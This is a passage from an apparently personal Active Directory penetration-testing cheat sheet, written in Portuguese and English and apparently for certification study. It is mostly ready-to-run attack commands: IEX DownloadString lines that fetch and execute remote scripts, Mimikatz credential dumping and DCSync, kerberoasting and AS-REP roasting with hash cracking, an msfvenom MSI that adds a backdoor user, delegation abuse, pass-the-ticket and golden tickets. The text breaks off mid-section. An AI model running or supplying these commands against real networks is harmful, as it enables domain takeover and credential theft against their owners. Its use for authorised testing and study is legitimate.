$ADGROUPS = Get-LocalGroupMember -Group "Administrators" | ?{ (($_.PrincipalSource -eq "ActiveDirectory") -and ($_.ObjectClass -eq "Group")) } 
foreach ($LINE in $ADGROUPS) {
$GROUPNAME = $LINE.NAME
$LINESPLIT = $GROUPNAME.Split("\")
$MYGROUP = $LINESPLIT[1]
$RESULT += Get-ADGroupMember -Identity $MYGROUP | select objectClass, SamAccountName | ft
}
$RESULT
```
##### LOCAL MACHINE - LIST LOCAL ADMINISTRATORS FROM ACTIVE DIRECTORY RECURSIVE
```
$RESULT = 
$ADGROUPS = Get-LocalGroupMember -Group "Administrators" | ?{ (($_.PrincipalSource -eq "ActiveDirectory") -and ($_.ObjectClass -eq "Group")) } 
foreach ($LINE in $ADGROUPS) {
$GROUPNAME = $LINE.NAME
$LINESPLIT = $GROUPNAME.Split("\")
$MYGROUP = $LINESPLIT[1]
$RESULT += Get-ADGroupMember -Identity $MYGROUP -Recursive | select objectClass, SamAccountName | ft
}
$RESULT
```
##### LOCAL MACHINE - LIST ALL GROUPS
```
Get-LocalGroup
Get-LocalGroup | ft -AutoSize | Out-String -Width 4096
```
```
Get-Netlocalgroup
Get-Netlocalgroup -computer server01
```
##### LOCAL MACHINE - LIST ALL MEMBERS OF ALL GROUPS
```
$DomainGroups = Get-LocalGroup
foreach ($Group in $DomainGroups)
{
    Write-Host "Group: $($Group.Name)" -background yellow -foreground black
    $GroupMembers = Get-LocalGroupMember -Group $Group
    foreach ($GroupMember in $GroupMembers)
    {
        Write-Host "    Member Name: $($GroupMember.Name)"
    }
}
```
##### LOCAL MACHINE - LIST ALL PERMISSIONS
```
(Get-ACL "AD:$((Get-ADComputer -Identity 'TECH-DC01').distinguishedname)").access | Select IdentityReference, AccessControlType, ActiveDirectoryRights
```



##### POWERVIEW - IMPORT
```
Import-module .\Microsoft.ActiveDirectory.Management.dll
Import-module .\activedirectory.psd1
```
##### LIST - GPOS(POWERVIEW)
```
get-netgpo
get-netgpo -computer server01
```
# BLOODHOUND
## TECHNIQUES
##### BLOODHOUND - PYTHON
```
git clone https://github.com/fox-it/BloodHound.py
cd BloodHound.py
python setup.py install
```
```
bloodhound-python -u username -p password -dc xx.aa.com --disable-auto-gc -d aa.com         --CHECAR OPÇÔES DEFAULT , INTERESSANTE LIMITAR AOS DOMAIN CONTROLELRS
bloodhound-python -u username -p password -dc xx.aa.com --disable-auto-gc -d aa.com -c all   --TODOS O S METODOS DE COLLECTION
```
##### BLOODHOUND - POWERSHELL
```
IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/SharpHound.ps1  -Outfile SharpHound.ps1
import-module .\SharpHound.ps1
```
```
Invoke-BloodHound 
Invoke-Bloodhound -collectionmethod all
Invoke-Bloodhound -collectionmethod all -excludedc
Invoke-BloodHound -CollectionMethod ACL,ObjectProps
Invoke-Bloodhound -collectionmethod DCOnly
-CompressData -RemoveCSV and -NoSaveCache   --GERAR O ARQUIVO ZIP PARA ARRASRTAR NO BLOODHOUND
```
##### BLOODHOUND - POWERSHELL COMANDOS PREFERIDOS
```
Invoke-BloodHound 
Invoke-Bloodhound -collectionmethod all
Invoke-Bloodhound -collectionmethod DCOnly
Invoke-Bloodhound -collectionmethod Loggedon
```
##### BLOODHOUND - SHARPHOUND
```
curl https://github.com/n0ts0cial/oscp/raw/main/SharpHound.exe  -Outfile SharpHound.exe
```
```
SharpHound.exe
.\SharpHound.exe
.\SharpHound.exe --collectionmethods DCOnly
.\SharpHound.exe --collectionmethods Loggedon
```
##### BLOODHOUND - INICIAR
NA CONSOLE DE ROOT
```
neo4j console
```
NA INTERFACE GRAFICA
```
sudo bloodhound
```


# MIMIKATZ
## TECHNIQUES
##### MIMIKATZ - DOWNLOAD E EXECUTE ZIP VIA POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
cd x64
.\mimikatz.exe
```
##### MIMIKATZ - DOWNLOAD E EXECUTE EXE VIA POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```
# RUBEUS
## TECHNIQUES
##### RUBEUS - DOWNLOAD E EXECUTE EXE VIA POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
.\rubeus.exe
```
# SEATBELT (https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seatbelt)
## TECHNIQUES
##### SEATBELT - DOWNLOAD E EXECUTE ZIP VIA POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/Seatbelt.exe -Outfile Seatbelt.exe
Seatbelt.exe -group=all
.\Seatbelt.exe -group=all
```
# PRIVILEGE ESCALATION WINDOWS
## [POWERUP](https://blog.certcube.com/powerup-cheatsheet/)
##### POWERUP DOWNLOAD
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerUp.ps1")
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/PowerUp.ps1  -Outfile PowerUp.ps1
import-module .\PowerUp.ps1
```
##### POWERUP - CHECAR TUDO
```
invoke-allchecks
```
##### POWERUP - ACHAR UNQUOTED SERVICE
```
Get-Serviceunquoted -Verbose
```
##### POWERUP - ACHAR SERVIÇOS ONDE O USUARIO ATUAL PODE ALTERAR O BINARIO OU MUDAR OS ARGUMENTOS
```
Get-ModifiableServiceFile -Verbose
```
##### POWERUP - COMANDOS
```
SERVICE ENUMERATION:

Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail

SERVICE ABUSE:
Invoke-ServiceAbuse
Write-ServiceBinary
Install-ServiceBinary
Restore-ServiceBinary

DLL HIJACKING:

Find-ProcessDLLHijack
Find-PathDLLHijack
Write-HijackDll

REGISTRY CHECKS:

Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-ModifiableRegistryAutoRun

MISCELLANEOUS CHECKS:

Get-ModifiableScheduledTaskFile
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword

OTHER HELPERS:

Get-ModifiablePath
Get-CurrentUserTokenGroupSid
Add-ServiceDacl
Set-ServiceBinPath
Test-ServiceDaclPermission
Write-UserAddMSI
Invoke-AllChecks
```
##### POWERUP ATAQUE - ADICIONAR USUARIO JOHN COM SENHA: Password123!
```
Invoke-ServiceAbuse -Name VulnSVC   
Get-Service VulnSVC | Invoke-ServiceAbuse
```
##### POWERUP ATAQUE - ADICIONAR AOS ADMINISTRADORES
```
Invoke-ServiceAbuse -Name VulnSVC -UserName "TESTLAB\john"
```
##### POWERUP ATAQUE - ADICIONAR USUARIO, SENHA E ADICIONAR NO GRUPO
```
Invoke-ServiceAbuse -Name VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"
```
##### POWERUP ATAQUE - EXECCUTAR COMANDO:
```
Invoke-ServiceAbuse -Name VulnSVC -Command "net ..."
```
## SHARPUP
```
curl https://github.com/n0ts0cial/oscp/raw/main/SharpUp.exe -Outfile SharpUp.exe
```
##### SHARPUP - CHECAR TUDO
```
.\SharpUp.exe
.\SharpUp.exe > result.txt
.\SharpUp.exe audit
.\SharpUp.exe audit > result.txt
```
##### SHARPUP - EXEMPLOS
```
.\ SharpUp.exe ModifiableServiceBinaries
.\SharpUp.exe audit ModifiableServiceBinaries
```
##### SHARPUP - OPÇÕES
```
.\SharpUp.exe AlwaysInstallElevated
.\SharpUp.exe CachedGPPPassword
.\SharpUp.exe DomainGPPPassword
.\SharpUp.exe HijackablePaths
.\SharpUp.exe McAfeeSitelistFiles
.\SharpUp.exe ModifiableScheduledTask
.\SharpUp.exe ModifiableServiceBinaries
.\SharpUp.exe ModifiableServiceRegistryKeys
.\SharpUp.exe ModifiableServices
.\SharpUp.exe ProcessDLLHijack
.\SharpUp.exe RegistryAutoLogons
.\SharpUp.exe RegistryAutoruns
.\SharpUp.exe TokenPrivileges
.\SharpUp.exe UnattendedInstallFiles
.\SharpUp.exe UnquotedServicePath
```


## TECHNIQUES
##### ALWAYS ELEVATED(1)
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
```
```
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
msiexec /quiet /qn /i C:\evil.msi
```
# ATTACK - ACTIVE DIRECTORY
## KERBEROASTING
##### KERBEROASTING - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
import-module .\Microsoft.ActiveDirectory.Management.dll
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
import-module .\PowerView.ps1
```
##### KERBEROASTING - FIND SPN
PROCURE POR CONTAS COM PERMISSÕES ADMINISTRATIVAS, EM GRUPOS COM PERMISSÕES ADMINISTRATIVAS
```
Get-ADUSer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName
$FormatEnumerationLimit=-1
Get-ADComputer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName | Out-String -Width 4096
```
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
```
##### KERBEROASTING - LIST ALL SPN
```
$MySearch = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$MySearch.filter = "(servicePrincipalName=*)"
$MyResults = $MySearch.Findall()

foreach($result in $MyResults)
{
 $userEntry = $result.GetDirectoryEntry()
 Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
 Write-host "DN = "  $userEntry.distinguishedName
 Write-host "Object Cat. = "  $userEntry.objectCategory
 Write-host "servicePrincipalNames"
 $i=1
 foreach($SPN in $userEntry.servicePrincipalName)
  {
  Write-host "SPN(" $i ")   = "   $SPN
  $i+=1
  }
  Write-host ""
  }
```
##### KERBEROASTING - LIST ALL SPN USERS
```
$MySearch = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$MySearch.filter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
$MyResults = $MySearch.Findall()

foreach($result in $MyResults)
{
 $userEntry = $result.GetDirectoryEntry()
 Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
 Write-host "DN = "  $userEntry.distinguishedName
 Write-host "Object Cat. = "  $userEntry.objectCategory
 Write-host "servicePrincipalNames"
 $i=1
 foreach($SPN in $userEntry.servicePrincipalName)
  {
  Write-host "SPN(" $i ")   = "   $SPN
  $i+=1
  }
  Write-host ""
  }
```
##### KERBEROASTING - REQUEST A TGS TICKET
```
Add-Type -Assemblyname System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argumentlist "HTTP/MyServiceComputer.TECH.LOCAL"
```
```
Request-SPNTicket -SPN "HTTP/MyServiceComputer.TECH.LOCAL" -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
```
```
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /user:analystm2 /nowrap
Rubeus.exe kerberoast /user:analystm2 /nowrap /simple
Rubeus.exe kerberoast /user:analystm2 /nowrap /simple /outfile:C:\hashestgt.txt
```
```
.\mimikatz.exe
kerberos::list /export
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
##### KERBEROASTING - CRACK PASSWORD
```
hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt
hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt -o quebradas.txt
hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt --show
```
```
john hashestgt.txt --wordlist=wordlist.txt
john --format=krb5tgs hashestgt.txt --wordlist=wordlist.txt
john --show hashestgt.txt
rm  /root/.john/john.pot
```
##### KERBEROS - CONVERTER TICKET KIRBI PARA BASE64
```
kirbi2john ticket.kirbi > ticket.john
john -format=krb5tgs ticket.john --wordlist=wordlist.txt
john -format=krb5tgs ticket.john --show
hashcat -m 13100 -a 0 ticket.john wordlist.txt
hashcat -m 13100 -a 0 ticket.john wordlist.txt --show
hashcat -m 13100 -a 0 ticket.john wordlist.txt --potfile-disable
```
## KERBEROASTING-ASREP
##### KERBEROASTINGASREP - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
import-module .\Microsoft.ActiveDirectory.Management.dll
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
import-module .\PowerView.ps1
```
##### KERBEROASTING-ASREP - FIND USERS
PROCURE POR CONTAS COM PERMISSÕES ADMINISTRATIVAS, EM GRUPOS COM PERMISSÕES ADMINISTRATIVAS
```
Get-ADUSer -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth
Get-ADUSer -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth | select SamAccountName, ServicePrincipalName
```
```
Get-DomainUser -PreauthNotRequired -Verbose
Get-DomainUser -PreauthNotRequired 
Get-DomainUser -PreauthNotRequired | select samaccountname
Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'}
Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'} | select samaccountname
```
##### KERBEROASTING-ASREP - FIND ALL USERS
```
$MySearch = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$MySearch.filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$MyResults = $MySearch.Findall()
foreach($result in $MyResults)
{
 $userEntry = $result.GetDirectoryEntry()
 Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
 Write-host "DN = "  $userEntry.distinguishedName
 Write-host "Object Cat. = "  $userEntry.objectCategory
 Write-host "SamAccountName = "  $userEntry.SamAccountName
 Write-host "servicePrincipalNames"
 $i=1
 foreach($SPN in $userEntry.servicePrincipalName)
  {
  Write-host "SPN(" $i ")   = "   $SPN
  $i+=1
  }
  Write-host ""
  }
```
##### KERBEROASTING-ASREP - PESQUISAR PERMISSOES SUSPEITAS
```
$FormatEnumerationLimit=-1
Invoke-ACLScanner -ResolveGUIDs | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
```
```
$FormatEnumerationLimit=-1
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "bruno"} | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
```
```
$FormatEnumerationLimit=-1
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Domain Admins"} | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
```
SE ACHAR, PODE DESABILITAR O KERBEROS PREAUTH MANUALMENTE
```
Set-DomainObject -Identity test4 -XOR @{useraccountcontrol=4194304} -Verbose
Set-ADAccountControl -Id kamisama -DoesNotRequirePreAuth:$true
```
##### KERBEROASTING-ASREP - OBTER O HASH DE USUARIOS USANDO SOMENTE POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/ASREPRoast.ps1 -Outfile ASREPRoast.ps1
import-module .\ASREPRoast.ps1
Get-ASREPHash -Username test3 -Verbose
```
```
$FormatEnumerationLimit=-1
Invoke-ASREPRoast -Verbose | Out-String -Width 4096
```
##### KERBEROASTING-ASREP - OBTER O HASH DE USUARIOS USANDO RUBEUS
```
Rubeus.exe asreproast /nowrap
Rubeus.exe asreproast /user:test3 /nowrap
Rubeus.exe asreproast /user:test3 /nowrap /simple
Rubeus.exe asreproast /user:test3 /nowrap /simple /outfile:hash.txt
Rubeus.exe asreproast /user:test3 /format:hashcat /nowrap
```
##### KERBEROASTING-ASREP - CRACK PASSWORD
```
john hashes.txt --wordlist=wordlist.txt
john --format=krb5asrep hashes.txt --wordlist=wordlist.txt
john --show hashes.txt
rm  /root/.john/john.pot
```
HASHCAT - TIPO23 (17 ou 19)
```
hashcat -m 18200 -a 0 hashes.txt wordlist.txt
hashcat -m 18200 -a 0 hashes.txt wordlist.txt -o quebradas.txt
hashcat -m 18200 -a 0 hashes.txt wordlist.txt --show
hashcat -m 18200 -a 0 hashes.txt wordlist.txt --potfile-disable
```
## UNCONSTRAINED DELEGATION - MIMIKATZ
Unconstrained delegation is a privilege that can be assigned to users or computers, this almost always happens on computers with services such as ISS and MSSQL. These services usually require access to a backend database on behalf of the authenticated user. When a user authenticates on a computer with Kerberos unrestricted delegation privilege enabled, the user's authenticated TGT ticket is stored in that computer's memory. If you have administrator access to this server, it is possible to dump all TGT tickets from memory.
##### UNCONSTRAINED DELEGATION MIMIKATZ - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
import-module .\Microsoft.ActiveDirectory.Management.dll
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
import-module .\PowerView.ps1
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
```
##### UNCONSTRAINED DELEGATION MIMIKATZ - FIND COMPUTERS WITH UNCONSTRAINED DELEGATION (POWERVIEW)
PROCURE POR CONTAS DE COMPUTADOR COM UNCONSTRAINED DELEGATION
```
Get-NetComputer -UnConstrained
Get-NetComputer -UnConstrained | select samaccountname       
```
```
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description | select samaccountname 
```
```
$LDAPSEARCH = New-Object System.DirectoryServices.DirectorySearcher
$LDAPSEARCH.Filter = "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
$LDAPSEARCH.FindAll()
```
```
ldapsearch -LLL -x -h 54.189.219.43   -D "vegeta@tech.local" -W -b "DC=tech,DC=local" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
ldapsearch -LLL -x -h 54.189.219.43   -D "regularuser@tech.local" -W -b "DC=tech,DC=local" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep sAMAccountName
```
##### UNCONSTRAINED DELEGATION MIMIKATZ - DEPOIS DE COMPROMETER O SERVIDOR COM UD, EXPORTAR OS TICKETS KERBEROS.
```
curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
Invoke-Mimikatz
```
##### UNCONSTRAINED DELEGATION MIMIKATZ - LISTAR OS TICKETS / EXPORTAR OS TICKETS COM MIMIKATZ (WAIT OR TRICK AN USER TO USE THE UNCONSTRAINED DELEGATION SERVICE)
```
sekurlsa::tickets
sekurlsa::tickets /export
```
##### UNCONSTRAINED DELEGATION MIMIKATZ - VERIFICAR QUEM ESTÁ LOGADO EM UMA MÁQUINA / ONDE UM USUARIO ESTÁ LOGADO
AGUARDAR ALGUM USUARIO SE CONECTAR E FICAR MONITORANDO (OPTIONAL) (PRECISA DE ALGUM TIPO DE ADMIN)
```
Invoke-UserHunter -ComputerName server01  -Delay 5 -Verbose
Invoke-UserHunter -ComputerName server01 -UserIdentity administrator -Delay 5 -Verbose
```
##### UNCONSTRAINED DELEGATION MIMIKATZ - REUTILIZAR O TICKET DO USUARIO:  (VAI IMPORTAR NO CONTEXTO DO USUARIO, INICIAR NOVO MIMKATZ COM USUARIO NORMAL E IMPORTAR)
```
dir *.kirbi | findstr /I krbtgt | findstr /V "$@"
```
```
kerberos::ptt C:\pentest\tickets\[0;9fc25]-2-0-60a10000-Administrator@krbtgt-TECH.LOCAL.kirbi
```


## UNCONSTRAINED DELEGATION - RUBEUS
Unconstrained delegation is a privilege that can be assigned to users or computers, this almost always happens on computers with services such as ISS and MSSQL. These services usually require access to a backend database on behalf of the authenticated user. When a user authenticates on a computer with Kerberos unrestricted delegation privilege enabled, the user's authenticated TGT ticket is stored in that computer's memory. If you have administrator access to this server, it is possible to dump all TGT tickets from memory.
##### UNCONSTRAINED DELEGATION RUBEUS - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Rubeus.ps1")
```

##### UNCONSTRAINED DELEGATION RUBEUS - LIST TICKETS
```
.\Rubeus.exe triage
.\Rubeus.exe triage /user:administrator
.\Rubeus.exe triage /luid:0xd62d4
```
```
Invoke-Rubeus triage
Invoke-Rubeus 'triage'
```
##### UNCONSTRAINED DELEGATION RUBEUS - MONITORAR E EXTRAIR OS TICKETS KERBEROS DA MEMÓRIA DO COMPUTADOR:
```
.\Rubeus.exe  monitor /interval:5 /nowrap
.\Rubeus.exe  monitor /interval:5 /nowrap > C:\tickets.log
.\Rubeus.exe  monitor /interval:5 >> C:\tickets.log
.\Rubeus.exe monitor /monitorinterval:5 /targetuser:DC$ /nowrap
```
It may be sufficent to just wait and see what privileged or high-interest users/computers authenticate to our compromised host, 
or it may be possible to force a sensitive system to authenticate through the printerbug.
##### UNCONSTRAINED DELEGATION RUBEUS - EXPORTAR UM TICKET:
```
.\Rubeus.exe dump /nowrap
.\Rubeus.exe dump /nowrap /user:administrator
.\Rubeus.exe dump /nowrap /luid:0xd62d4
```
##### UNCONSTRAINED DELEGATION RUBEUS - PASS THE TICKET (TGT)
```
Rubeus.exe ptt /ticket:sdjadjaspjdapsidpsaijpiasdiasjDCCBdygAwI9DQUw=
```
```
Invoke-Rubeus 'ptt /ticket:sdjadjaspjdapsidpsaijpiasdiasjDCCBdygAwI9DQUw='
```
##### UNCONSTRAINED DELEGATION RUBEUS - FORÇAR COMPUTADOR A SE AUTENTICAR EM OUTRO
LEMBRAR DE MONITORAR COM O RUBEUS ANTES:
```
.\Rubeus.exe  monitor /interval:5 /nowrap
```
FORÇAR COMPUTADOR A SE AUTENTICAR NO OUTRO
```
curl https://github.com/n0ts0cial/oscp/raw/main/SpoolSample.exe -Outfile SpoolSample.exe
.\SpoolSample.exe tech-dc01 server02
```
IMPORTAR O TICKET DO DC:
```
.\Rubeus.exe ptt /ticket:doIFqjCCBaagguTE9DQUw=
```
CARREGAR O MIMIKATZ E FAZER O DCSYNC:
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
Invoke-Mimikatz
```
OPÇÃO 1 - FAZER O ATAQUE DCSYNC
```
lsadump::dcsync /user:tech\krbtgt
lsadump::dcsync /domain:TECH.LOCAL /all /csv
```
OPÇÃO 2 - CRIAR UMA CONTA NO DOMINIO
```
$PASSWORD= ConvertTo-SecureString -AsPlainText -Force -String 123qwe..
New-ADUser -Name "pentester" -Description "Pentester User" -Enabled $true -AccountPassword $PASSWORD
```
OPÇÃO 3 - ACESSAR REMOTAMENTE VIA PSREMOTE
```
Enter-Pssession -computername tech-dc01
```
OPÇÃO 4 - CRIAR GOLDEN TICKETS
```
kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
```
OPÇÃO 5 - VERIFICAR ONDE SOU ADMINISTRADOR LOCAL
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
FIND-LOCALADMINACCESS
```
##### UNCONSTRAINED DELEGATION RUBEUS - CONVERTER TICKET DO RUBEUS BASE64 PARA MIMIKATZ KIRBI
```
[IO.File]::WriteAllBytes("C:\ticket.kirbi", [Convert]::FromBase64String("doIFqjCCBaRFQ0guTE9DQUw="))
```
IMPORTAR NO MIMIKATZ: (USUARIO NORMAL) E FAZER O DCSYNC:
```
Invoke-Mimikatz
kerberos::ptt ticket.kirbi
```
```
lsadump::dcsync /user:tech\krbtgt
```
##### UNCONSTRAINED DELEGATION RUBEUS - CONVERTER TICKET KIRBI PARA BASE64 (SÓ PRA CONSTAR E FICAR JUNTO)
```
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\ticket.kirbi")); 
```
## CONSTRAINED DELEGATION
If you have an account or computer with the constrained delegation privilege, it is possible to impersonate any other user and authenticate yourself to a service where the user is allowed to delegate.
##### CONSTRAINED DELEGATION - FIND COMPUTERS AND USERS WITH CONSTRAINED DELEGATION
ENCONTRAR APENAS COMPUTADORES
```
$FormatEnumerationLimit=-1
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
```
ENCONTRAR APENAS USUARIOS
```
$FormatEnumerationLimit=-1
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
```
ENCONTRAR COMPUTADORES E USUARIOS
```
$FormatEnumerationLimit=-1
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
ENCONTRAR APENAS COMPUTADORES (POWERVIEW)
```
$FormatEnumerationLimit=-1
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
Get-DomainComputer -TrustedToAuth
```
ENCONTRAR APENAS USUARIOS (POWERVIEW)
```
$FormatEnumerationLimit=-1
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
Get-DomainUser -TrustedToAuth
```
##### CONSTRAINED DELEGATION (USUARIO) - NO RUBEUS, GERAR O HASH RC4 DA SENHA DO USUARIO: yamcha 1A9D94FDE4F369D53FA5515D1D6BEEE0
```
rubeus.exe hash /password:123qwe..
```
OU PEGAR O HASH DIRETO COM O MIMIKATZ:
```
Privilege::debug
Sekurlsa::logonpasswords
```
##### CONSTRAINED DELEGATION (USUARIO) - NO RUBEUS, SOLICITAR TGS PARA A MAQUINA QUE TEMOS ACESSO PARA OS SERVICOS AUTORIZADOS NO AD: (cifs/TECH-DC01.TECH.LOCAL)
```
rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /ptt
```
SOLICITAR TICKET PARA OUTROS SERVIÇOS
```
rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:cifs,host,ldap /ptt 
```
##### CONSTRAINED DELEGATION (COMPUTADOR) - PEGAR A SENHA NTLM DO COMPUTADOR LSA SECRETS: SERVER02$ e219f089ce0807399b81ed7950c64e2b
PEGAR O HASH DIRETO COM O MIMIKATZ:
```
Privilege::debug
Sekurlsa::logonpasswords
```
##### CONSTRAINED DELEGATION (COMPUTADOR) - NO RUBEUS, SOLICITAR TGS PARA A MAQUINA QUE TEMOS ACESSO PARA OS SERVICOS AUTORIZADOS NO AD: (cifs/TECH-DC01.TECH.LOCAL)
```
rubeus.exe s4u /user:SERVER02$ /rc4:e219f089ce0807399b81ed7950c64e2b /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /ptt
```
SOLICITAR TICKET PARA OUTROS SERVIÇOS
```
rubeus.exe s4u /user:SERVER02$ /rc4:e219f089ce0807399b81ed7950c64e2b /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:host,http,wsman,rpcss,ldap,cifs /ptt
```
##### CONSTRAINED DELEGATION - OPÇÕES DE ATAQUE
- OPÇÃO 1 - FAZER O ATAQUE DCSYNC

OBTER TICKET LDAP:
```
